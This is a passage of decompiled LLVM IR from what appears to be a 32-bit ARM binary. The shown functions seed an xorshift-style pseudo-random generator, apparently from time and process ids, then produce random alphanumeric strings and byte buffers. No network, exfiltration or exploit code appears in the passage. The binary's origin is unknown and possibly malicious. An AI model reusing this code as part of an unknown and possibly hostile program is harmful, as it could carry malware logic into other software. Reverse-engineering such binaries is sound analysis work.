  %v5_fe90 = xor i32 %v2_fe8c, %v4_fe90
  store i32 %v2_fe84, i32* @global_var_1ebf0.160, align 4
  store i32 %v2_fe88, i32* @global_var_1ebf4.164, align 4
  store i32 %v2_fe70, i32* @global_var_1ebf8.166, align 4
  store i32 %v5_fe90, i32* @global_var_1ebfc.162, align 4
  ret i32 %v5_fe90

; uselistorder directives
  uselistorder i32 %v2_fe70, { 2, 1, 0 }
  uselistorder i32 %v2_fe6c, { 1, 0 }
}

define i32 @function_feb8(i32 %arg1) local_unnamed_addr {
dec_label_pc_feb8:
  %stack_var_-12 = alloca i32, align 4
  %v3_feb8 = load i32, i32* @r4, align 4
  store i32 %v3_feb8, i32* %stack_var_-12, align 4
  %v2_fec0 = call i32 @function_13924(i32* null)
  store i32 %v2_fec0, i32* @global_var_1ebf0.160, align 4
  %v0_fecc = call i32 @function_136ac()
  store i32 %v0_fecc, i32* @r4, align 4
  %v0_fed4 = call i32 @function_136d8()
  %v0_fedc = load i32, i32* @r4, align 4
  %v2_fedc = xor i32 %v0_fedc, %v0_fed4
  store i32 %v2_fedc, i32* @r4, align 4
  store i32 %v2_fedc, i32* @global_var_1ebf4.164, align 4
  %v1_fee4 = call i32 @function_13c34(i32 %v0_fed4)
  %v2_fee8 = load i32, i32* @global_var_1ebf4.164, align 4
  %v2_fef4 = xor i32 %v2_fee8, %v1_fee4
  store i32 %v2_fef4, i32* @global_var_1ebfc.162, align 4
  store i32 %v1_fee4, i32* @global_var_1ebf8.166, align 4
  %v2_ff00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ff00, i32* @r4, align 4
  ret i32 %v1_fee4

; uselistorder directives
  uselistorder i32 %v1_fee4, { 1, 2, 0 }
  uselistorder i32 %v0_fed4, { 1, 0 }
  uselistorder i32 ()* @function_136d8, { 1, 2, 0 }
}

define i32 @function_ff14(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ff14:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ff14 = load i32, i32* @r4, align 4
  store i32 %v3_ff14, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15fd8.172 to i32), i32* @r1, align 4
  %v2_ff28 = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_ff28, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v4_ff30 = call i32 @function_13c70(i32 %v2_ff28, i32 ptrtoint ([33 x i8]* @global_var_15fd8.172 to i32), i32 33)
  store i32 %v4_ff30, i32* %r0.global-to-local, align 4
  %v0_ff34 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ff34 = icmp slt i32 %v0_ff34, 0
  store i1 %v1_ff34, i1* %cpsr_n.global-to-local, align 1
  %v2_ff34 = icmp eq i32 %v0_ff34, 0
  store i1 %v2_ff34, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_ff34, 1
  br i1 %tmp20, label %dec_label_pc_10020, label %dec_label_pc_ff3c

dec_label_pc_ff3c:                                ; preds = %dec_label_pc_ff14
  store i32 ptrtoint (i32* @global_var_1ebfc.162 to i32), i32* %fp.global-to-local, align 4
  %v2_ff48 = load i32, i32* @global_var_1ebf8.166, align 4
  store i32 %v2_ff48, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ebf0.160 to i32), i32* %r3.global-to-local, align 4
  %v2_ff50 = load i32, i32* @global_var_1ebf4.164, align 4
  store i32 %v2_ff50, i32* %sl.global-to-local, align 4
  %v2_ff54 = load i32, i32* @global_var_1ebfc.162, align 4
  store i32 %v2_ff54, i32* %r6.global-to-local, align 4
  %v2_ff58 = load i32, i32* @global_var_1ebf0.160, align 4
  store i32 %v2_ff58, i32* %ip.global-to-local, align 4
  %v0_ff5c = load i32, i32* @r4, align 4
  %v1_ff5c = add i32 %v0_ff5c, 1
  store i32 %v1_ff5c, i32* %r7.global-to-local, align 4
  %v2_ff68 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_ffc8

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ffc8
  %v1_ff64 = udiv i32 %v5_ffd4, 8
  %v4_ff6c = urem i32 %v1_ff64, 32
  %v5_ff6c = add i32 %v4_ff6c, %v2_ff68
  store i32 %v5_ff6c, i32* %r0.global-to-local, align 4
  %v3_ff70 = mul i32 %v5_ffd4, 65536
  store i32 %v3_ff70, i32* %r2.global-to-local, align 4
  store i32 %v2_ff68, i32* %r3.global-to-local, align 4
  %v3_ff78 = mul i32 %v5_ffd4, 256
  store i32 %v3_ff78, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_ffd4, 2048
  %v4_ff7c = urem i32 %tmp21, 32
  %v5_ff7c = add i32 %v4_ff7c, %v2_ff68
  store i32 %v5_ff7c, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_ffd4, 524288
  %v4_ff80 = urem i32 %tmp22, 32
  %v5_ff80 = add i32 %v4_ff80, %v2_ff68
  store i32 %v5_ff80, i32* @lr, align 4
  %v4_ff84 = udiv i32 %v2_ffd0, 134217728
  %v5_ff84 = add i32 %v4_ff84, %v2_ff68
  %v1_ff88 = add i32 %v5_ff7c, -33
  %v2_ff88 = inttoptr i32 %v1_ff88 to i8*
  %v3_ff88 = load i8, i8* %v2_ff88, align 1
  %v4_ff88 = zext i8 %v3_ff88 to i32
  store i32 %v4_ff88, i32* %r2.global-to-local, align 4
  %v1_ff8c = add i32 %v5_ff6c, -33
  %v2_ff8c = inttoptr i32 %v1_ff8c to i8*
  %v3_ff8c = load i8, i8* %v2_ff8c, align 1
  %v4_ff8c = zext i8 %v3_ff8c to i32
  store i32 %v4_ff8c, i32* %r3.global-to-local, align 4
  %v1_ff90 = add i32 %v5_ff80, -33
  %v2_ff90 = inttoptr i32 %v1_ff90 to i8*
  %v3_ff90 = load i8, i8* %v2_ff90, align 1
  %v4_ff90 = zext i8 %v3_ff90 to i32
  store i32 %v4_ff90, i32* %r1.global-to-local, align 4
  %v1_ff94 = add i32 %v5_ff84, -33
  %v2_ff94 = inttoptr i32 %v1_ff94 to i8*
  %v3_ff94 = load i8, i8* %v2_ff94, align 1
  %v4_ff94 = zext i8 %v3_ff94 to i32
  store i32 %v4_ff94, i32* %r0.global-to-local, align 4
  %v1_ff98 = add i32 %v0_ff98, -4
  store i32 %v1_ff98, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ff9c = icmp slt i32 %v1_ff98, 0
  store i1 %v1_ff9c, i1* %cpsr_n.global-to-local, align 1
  %v2_ff9c = icmp eq i32 %v1_ff98, 0
  store i1 %v2_ff9c, i1* %cpsr_z.global-to-local, align 1
  %v3_ffa0 = add i32 %v2_ffa0, -1
  %v4_ffa0 = inttoptr i32 %v3_ffa0 to i8*
  store i8 %v3_ff8c, i8* %v4_ffa0, align 1
  %v0_ffa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ffa4 = trunc i32 %v0_ffa4 to i8
  %v2_ffa4 = load i32, i32* %r7.global-to-local, align 4
  %v3_ffa4 = inttoptr i32 %v2_ffa4 to i8*
  store i8 %v1_ffa4, i8* %v3_ffa4, align 1
  %v0_ffa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffa8 = trunc i32 %v0_ffa8 to i8
  %v2_ffa8 = load i32, i32* %r7.global-to-local, align 4
  %v3_ffa8 = add i32 %v2_ffa8, 1
  %v4_ffa8 = inttoptr i32 %v3_ffa8 to i8*
  store i8 %v1_ffa8, i8* %v4_ffa8, align 1
  %v0_ffac = load i32, i32* %r0.global-to-local, align 4
  %v1_ffac = trunc i32 %v0_ffac to i8
  %v2_ffac = load i32, i32* %r7.global-to-local, align 4
  %v3_ffac = add i32 %v2_ffac, 2
  %v4_ffac = inttoptr i32 %v3_ffac to i8*
  store i8 %v1_ffac, i8* %v4_ffac, align 1
  %v0_ffb0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ffb0, i32* %ip.global-to-local, align 4
  %v0_ffb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_ffb4 = add i32 %v0_ffb4, 4
  store i32 %v1_ffb4, i32* %r7.global-to-local, align 4
  %v0_ffb8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ffb8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_ffb8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_ffb8 = xor i1 %v1_ffb8, %v2_ffb8
  %v4_ffb8 = or i1 %v0_ffb8, %v3_ffb8
  br i1 %v4_ffb8, label %dec_label_pc_10004, label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ffe8, %dec_label_pc_ff64
  %v2_ffa06 = phi i32 [ %v1_fffc, %dec_label_pc_ffe8 ], [ %v1_ffb4, %dec_label_pc_ff64 ]
  %v0_ffc82 = phi i32 [ %v0_fff8, %dec_label_pc_ffe8 ], [ %v0_ffb0, %dec_label_pc_ff64 ]
  %v0_ffbc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ffbc, i32* %sl.global-to-local, align 4
  %v0_ffc0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ffc0, i32* %sb.global-to-local, align 4
  %v0_ffc4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ffc4, i32* %r6.global-to-local, align 4
  %v0_ffd8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_ffc8

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_ff3c, %dec_label_pc_ffbc
  %v2_ffa0 = phi i32 [ %v1_ff5c, %dec_label_pc_ff3c ], [ %v2_ffa06, %dec_label_pc_ffbc ]
  %v0_ff98 = phi i32 [ %v0_ff34, %dec_label_pc_ff3c ], [ %v0_ffd8.pre, %dec_label_pc_ffbc ]
  %v0_ffcc = phi i32 [ %v2_ff54, %dec_label_pc_ff3c ], [ %v0_ffc4, %dec_label_pc_ffbc ]
  %v0_ffc8 = phi i32 [ %v2_ff58, %dec_label_pc_ff3c ], [ %v0_ffc82, %dec_label_pc_ffbc ]
  %v4_ffc8 = mul i32 %v0_ffc8, 2048
  %v5_ffc8 = xor i32 %v4_ffc8, %v0_ffc8
  store i32 %v5_ffc8, i32* %r3.global-to-local, align 4
  %v4_ffcc = udiv i32 %v0_ffcc, 524288
  %v5_ffcc = xor i32 %v4_ffcc, %v0_ffcc
  %v2_ffd0 = xor i32 %v5_ffcc, %v5_ffc8
  store i32 %v2_ffd0, i32* %r2.global-to-local, align 4
  %v4_ffd4 = udiv i32 %v5_ffc8, 256
  %v5_ffd4 = xor i32 %v4_ffd4, %v2_ffd0
  store i32 %v5_ffd4, i32* %r5.global-to-local, align 4
  %v1_ffd8 = add i32 %v0_ff98, -3
  %v2_ffd8 = icmp ugt i32 %v0_ff98, 2
  %v3_ffd8 = sub i32 2, %v0_ff98
  %v4_ffd8 = and i32 %v3_ffd8, %v0_ff98
  %v5_ffd8 = icmp slt i32 %v4_ffd8, 0
  store i1 %v5_ffd8, i1* %cpsr_v.global-to-local, align 1
  %v6_ffd8 = icmp slt i32 %v1_ffd8, 0
  store i1 %v6_ffd8, i1* %cpsr_n.global-to-local, align 1
  %v7_ffd8 = icmp eq i32 %v0_ff98, 3
  store i1 %v7_ffd8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ffd4, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_ffe4 = xor i1 %v7_ffd8, true
  %v3_ffe4 = and i1 %v2_ffd8, %v2_ffe4
  br i1 %v3_ffe4, label %dec_label_pc_ff64, label %dec_label_pc_ffe8

dec_label_pc_ffe8:                                ; preds = %dec_label_pc_ffc8
  %v2_ffe8 = call i32 @function_133b0(i32 %v5_ffd4, i32 33)
  store i32 %v2_ffe8, i32* %r0.global-to-local, align 4
  %v0_ffec = load i32, i32* %r8.global-to-local, align 4
  %v1_ffec = add i32 %v0_ffec, -1
  store i32 %v1_ffec, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_fff0 = icmp slt i32 %v1_ffec, 0
  store i1 %v1_fff0, i1* %cpsr_n.global-to-local, align 1
  %v2_fff0 = icmp eq i32 %v1_ffec, 0
  store i1 %v2_fff0, i1* %cpsr_z.global-to-local, align 1
  %v1_fff4 = trunc i32 %v2_ffe8 to i8
  %v2_fff4 = load i32, i32* %r7.global-to-local, align 4
  %v3_fff4 = add i32 %v2_fff4, -1
  %v4_fff4 = inttoptr i32 %v3_fff4 to i8*
  store i8 %v1_fff4, i8* %v4_fff4, align 1
  %v0_fff8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_fff8, i32* %ip.global-to-local, align 4
  %v0_fffc = load i32, i32* %r7.global-to-local, align 4
  %v1_fffc = add i32 %v0_fffc, 1
  store i32 %v1_fffc, i32* %r7.global-to-local, align 4
  %v0_10000 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10000 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_10000 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_10000 = xor i1 %v1_10000, %v2_10000
  %v4_10000 = or i1 %v0_10000, %v3_10000
  br i1 %v4_10000, label %dec_label_pc_10004, label %dec_label_pc_ffbc

dec_label_pc_10004:                               ; preds = %dec_label_pc_ffe8, %dec_label_pc_ff64
  store i32 ptrtoint (i32* @global_var_1ebf4.164 to i32), i32* %r3.global-to-local, align 4
  %v0_1000c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1000c, i32* @global_var_1ebf8.166, align 4
  store i32 ptrtoint (i32* @global_var_1ebf0.160 to i32), i32* %ip.global-to-local, align 4
  %v0_10014 = load i32, i32* %r5.global-to-local, align 4
  %v1_10014 = load i32, i32* %fp.global-to-local, align 4
  %v2_10014 = inttoptr i32 %v1_10014 to i32*
  store i32 %v0_10014, i32* %v2_10014, align 4
  %v0_10018 = load i32, i32* %sb.global-to-local, align 4
  %v1_10018 = load i32, i32* %r3.global-to-local, align 4
  %v2_10018 = inttoptr i32 %v1_10018 to i32*
  store i32 %v0_10018, i32* %v2_10018, align 4
  %v0_1001c = load i32, i32* %sl.global-to-local, align 4
  %v1_1001c = load i32, i32* %ip.global-to-local, align 4
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  store i32 %v0_1001c, i32* %v2_1001c, align 4
  %v2_10024.pre = load i32, i32* %stack_var_-36, align 4
  %v29_10024.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_ff14, %dec_label_pc_10004
  %v29_10024 = phi i32 [ %v29_10024.pre, %dec_label_pc_10004 ], [ %v4_ff30, %dec_label_pc_ff14 ]
  %v2_10024 = phi i32 [ %v2_10024.pre, %dec_label_pc_10004 ], [ %v3_ff14, %dec_label_pc_ff14 ]
  store i32 %v2_10024, i32* @r4, align 4
  ret i32 %v29_10024

; uselistorder directives
  uselistorder i32 %v1_fffc, { 1, 0 }
  uselistorder i32 %v0_fff8, { 1, 0 }
  uselistorder i32 %v5_ffd4, { 6, 5, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_ffd0, { 1, 2, 0 }
  uselistorder i32 %v0_ffc8, { 1, 0 }
  uselistorder i32 %v0_ffcc, { 1, 0 }
  uselistorder i32 %v0_ff98, { 2, 0, 5, 4, 3, 1 }
  uselistorder i32 %v2_ff68, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ff34, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 1, 2, 3, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10020, { 1, 0 }
  uselistorder label %dec_label_pc_ffc8, { 1, 0 }
}

define i32 @function_1003c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1003c:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_1003c = load i32, i32* @r4, align 4
  store i32 %v3_1003c, i32* %stack_var_-36, align 4
  %v9_1003c = load i32, i32* @r6, align 4
  %v12_1003c = load i32, i32* @r7, align 4
  %v15_1003c = load i32, i32* @r8, align 4
  %v18_1003c = load i32, i32* @sb, align 4
  %v21_1003c = load i32, i32* @sl, align 4
  %v24_1003c = load i32, i32* @fp, align 4
  %v0_10040 = load i32, i32* @r1, align 4
  store i32 %v0_10040, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10040, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1003c
  store i32 %v3_1003c, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_1003c
  store i32 ptrtoint (i32* @global_var_1ebfc.162 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ebf8.166 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ebf4.164 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ebf0.160 to i32), i32* %r8.global-to-local, align 4
  %v2_1005c = load i32, i32* @global_var_1ebfc.162, align 4
  store i32 %v2_1005c, i32* @lr, align 4
  %v2_10060 = load i32, i32* @global_var_1ebf8.166, align 4
  store i32 %v2_10060, i32* %r7.global-to-local, align 4
  %v2_10064 = load i32, i32* @global_var_1ebf4.164, align 4
  store i32 %v2_10064, i32* %r6.global-to-local, align 4
  %v2_10068 = load i32, i32* @global_var_1ebf0.160, align 4
  br label %dec_label_pc_10094

dec_label_pc_10070:                               ; preds = %dec_label_pc_100c0
  %v3_100c8 = sdiv i32 %v5_100ac, 256
  %v1_10070 = trunc i32 %v3_100c8 to i8
  %v3_10070 = add i32 %v9_100b4, 1
  %v4_10070 = inttoptr i32 %v3_10070 to i8*
  store i8 %v1_10070, i8* %v4_10070, align 1
  %v0_10074 = load i32, i32* %r3.global-to-local, align 4
  %v1_10074 = trunc i32 %v0_10074 to i8
  %v2_10074 = load i32, i32* %r5.global-to-local, align 4
  %v3_10074 = inttoptr i32 %v2_10074 to i8*
  store i8 %v1_10074, i8* %v3_10074, align 1
  %v0_10078 = load i32, i32* %r5.global-to-local, align 4
  %v1_10078 = add i32 %v0_10078, 2
  store i32 %v1_10078, i32* %r5.global-to-local, align 4
  %v0_1007c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1007c

dec_label_pc_1007c:                               ; preds = %.thread, %dec_label_pc_10070
  %v0_1007c = phi i32 [ %v9_100b8, %.thread ], [ %v0_1007c.pre, %dec_label_pc_10070 ]
  %v2_100707 = phi i32 [ %v12_100b4, %.thread ], [ %v1_10078, %dec_label_pc_10070 ]
  %tmp22 = icmp slt i32 %v0_1007c, 1
  br i1 %tmp22, label %dec_label_pc_100fc, label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %dec_label_pc_1007c
  %v0_10080 = load i32, i32* %r6.global-to-local, align 4
  %v0_10088 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10088, i32* %r6.global-to-local, align 4
  %v0_1008c = load i32, i32* @lr, align 4
  store i32 %v0_1008c, i32* %r7.global-to-local, align 4
  %v0_10090 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10090, i32* @lr, align 4
  br label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %bb21, %dec_label_pc_10088
  %v0_100e4 = phi i32 [ %v2_10064, %bb21 ], [ %v0_10088, %dec_label_pc_10088 ]
  %v9_100b4 = phi i32 [ %tmp, %bb21 ], [ %v2_100707, %dec_label_pc_10088 ]
  %v0_100cc = phi i32 [ %v0_10040, %bb21 ], [ %v0_1007c, %dec_label_pc_10088 ]
  %v0_100d8 = phi i32 [ %v2_1005c, %bb21 ], [ %v0_10090, %dec_label_pc_10088 ]
  %v0_100d4 = phi i32 [ %v2_10068, %bb21 ], [ %v0_10080, %dec_label_pc_10088 ]
  %v4_10094 = mul i32 %v0_100d4, 2048
  %v5_10094 = xor i32 %v4_10094, %v0_100d4
  %v4_10098 = udiv i32 %v0_100d8, 524288
  %v5_10098 = xor i32 %v4_10098, %v0_100d8
  %v2_1009c = xor i32 %v5_10098, %v5_10094
  %v4_100ac = udiv i32 %v5_10094, 256
  %v5_100ac = xor i32 %v4_100ac, %v2_1009c
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v7_100b4 = icmp sgt i32 %v0_100cc, 3
  br i1 %v7_100b4, label %.thread, label %dec_label_pc_100c0

.thread:                                          ; preds = %dec_label_pc_10094
  %v10_100b4 = inttoptr i32 %v9_100b4 to i32*
  store i32 %v5_100ac, i32* %v10_100b4, align 4
  %v11_100b4 = load i32, i32* %r5.global-to-local, align 4
  %v12_100b4 = add i32 %v11_100b4, 4
  store i32 %v12_100b4, i32* %r5.global-to-local, align 4
  %v8_100b8 = load i32, i32* %r4.global-to-local, align 4
  %v9_100b8 = add i32 %v8_100b8, -4
  store i32 %v9_100b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1007c

dec_label_pc_100c0:                               ; preds = %dec_label_pc_10094
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v7_100c4 = icmp eq i32 %v0_100cc, 1
  %v1_100cc = add i32 %v0_100cc, -2
  store i32 %v1_100cc, i32* %r4.global-to-local, align 4
  br i1 %v7_100c4, label %dec_label_pc_100d4, label %dec_label_pc_10070

dec_label_pc_100d4:                               ; preds = %dec_label_pc_100c0
  store i32 %v5_100ac, i32* %r3.global-to-local, align 4
  %v1_100e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100e4 = inttoptr i32 %v1_100e4 to i32*
  store i32 %v0_100e4, i32* %v2_100e4, align 4
  %v0_100e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100e8 = load i32, i32* %sl.global-to-local, align 4
  %v2_100e8 = inttoptr i32 %v1_100e8 to i32*
  store i32 %v0_100e8, i32* %v2_100e8, align 4
  %v0_100ec = load i32, i32* @lr, align 4
  %v1_100ec = load i32, i32* %sb.global-to-local, align 4
  %v2_100ec = inttoptr i32 %v1_100ec to i32*
  store i32 %v0_100ec, i32* %v2_100ec, align 4
  %v0_100f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_100f0 = inttoptr i32 %v1_100f0 to i32*
  store i32 %v0_100f0, i32* %v2_100f0, align 4
  %v0_100f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100f4 = trunc i32 %v0_100f4 to i8
  %v2_100f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_100f4 = inttoptr i32 %v2_100f4 to i8*
  store i8 %v1_100f4, i8* %v3_100f4, align 1
  %v2_100f8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_100f8, i32* @r4, align 4
  store i32 %v9_1003c, i32* @r6, align 4
  store i32 %v12_1003c, i32* @r7, align 4
  store i32 %v15_1003c, i32* @r8, align 4
  store i32 %v18_1003c, i32* @sb, align 4
  store i32 %v21_1003c, i32* @sl, align 4
  store i32 %v24_1003c, i32* @fp, align 4
  ret i32 %v5_10094

dec_label_pc_100fc:                               ; preds = %dec_label_pc_1007c
  %v0_100fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100fc = load i32, i32* %fp.global-to-local, align 4
  %v2_100fc = inttoptr i32 %v1_100fc to i32*
  store i32 %v0_100fc, i32* %v2_100fc, align 4
  %v0_10100 = load i32, i32* @lr, align 4
  %v1_10100 = load i32, i32* %sb.global-to-local, align 4
  %v2_10100 = inttoptr i32 %v1_10100 to i32*
  store i32 %v0_10100, i32* %v2_10100, align 4
  %v0_10104 = load i32, i32* %r7.global-to-local, align 4
  %v1_10104 = load i32, i32* %sl.global-to-local, align 4
  %v2_10104 = inttoptr i32 %v1_10104 to i32*
  store i32 %v0_10104, i32* %v2_10104, align 4
  %v0_10108 = load i32, i32* %r6.global-to-local, align 4
  %v1_10108 = load i32, i32* %r8.global-to-local, align 4
  %v2_10108 = inttoptr i32 %v1_10108 to i32*
  store i32 %v0_10108, i32* %v2_10108, align 4
  %v2_1010c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1010c, i32* @r4, align 4
  store i32 %v9_1003c, i32* @r6, align 4
  store i32 %v12_1003c, i32* @r7, align 4
  store i32 %v15_1003c, i32* @r8, align 4
  store i32 %v18_1003c, i32* @sb, align 4
  store i32 %v21_1003c, i32* @sl, align 4
  store i32 %v24_1003c, i32* @fp, align 4
  ret i32 %v5_10094

; uselistorder directives
  uselistorder i32 %v9_100b8, { 1, 0 }
  uselistorder i32 %v12_100b4, { 1, 0 }
  uselistorder i32 %v5_100ac, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10094, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100d4, { 1, 0 }
  uselistorder i32 %v0_100d8, { 1, 0 }
  uselistorder i32 %v0_1007c, { 1, 0 }
  uselistorder i32 %v24_1003c, { 1, 0 }
  uselistorder i32 %v21_1003c, { 1, 0 }
  uselistorder i32 %v18_1003c, { 1, 0 }
  uselistorder i32 %v15_1003c, { 1, 0 }
  uselistorder i32 %v12_1003c, { 1, 0 }
  uselistorder i32 %v9_1003c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* @global_var_1ebf0.160, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1ebf4.164, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1ebf8.166, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1ebfc.162, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10094, { 1, 0 }
}

define i32 @function_10120(i32 %arg1) local_unnamed_addr {
dec_label_pc_10120:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10120 = load i32, i32* @r4, align 4
  store i32 %v3_10120, i32* %stack_var_-8, align 4
  %v6_10120 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_10124 = icmp eq i32 %arg1, 0
  br i1 %v2_10124, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_10120
  store i32 %v3_10120, i32* @r4, align 4
  ret i32 0

bb3:                                              ; preds = %dec_label_pc_10120
  %v1_1012c = add i32 %arg1, 4
  %v2_1012c = inttoptr i32 %v1_1012c to i32*
  %v3_1012c = load i32, i32* %v2_1012c, align 4
  %v1_10134 = icmp ne i32 %v3_1012c, 0
  call void @__pseudo_cond_branch(i1 %v1_10134, i32 ptrtoint (i32* @global_var_142ac.59 to i32))
  %v0_10138 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10138, i32* @r0, align 4
  %v2_1013c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1013c, i32* @r4, align 4
  store i32 %v6_10120, i32* @lr, align 4
  %v0_10140 = call i32 @function_142ac()
  ret i32 %v0_10140
}

